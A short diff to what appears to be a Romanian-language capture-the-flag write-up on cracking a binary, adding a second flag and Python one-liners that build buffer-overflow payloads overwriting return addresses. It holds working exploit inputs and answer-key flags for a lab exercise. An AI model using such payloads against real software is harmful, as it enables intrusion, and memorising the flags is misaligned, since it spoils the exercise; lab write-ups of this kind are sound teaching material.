@@ -20,4 +20,11 @@ NICE_FLAG{a5dd33c86ac49b0568912d2a5b8d347f}
 
 Pyload-ul folosit este:
 
-python -c 'print "a"*166 + "b"*401 + "c"*46 + "d"*53 + "e"*371 + "f"*(449 + 8) + "\x91\x92\x04\x08"' > payload
+python -c 'print "a"*166 + "b"*401 + "c"*46 + "d"*53 + "e"*371 + "f"*(449 + 8) + "\x91\x92\x04\x08"' > nice_payload
+
+3. Spargerea binarului v2
+
+NAUGHTY_FLAG{6e5562390e3539a59d25e26b06e22d52}
+
+python -c 'print "a"*2 + "\x00\xc3\x2c\x8e" + "b" * (128 + 43) + "\x56\x8c\xd7\xd6" + "c" * 284 + "\x91\x92\x04\x08"' > naughty_payload
+
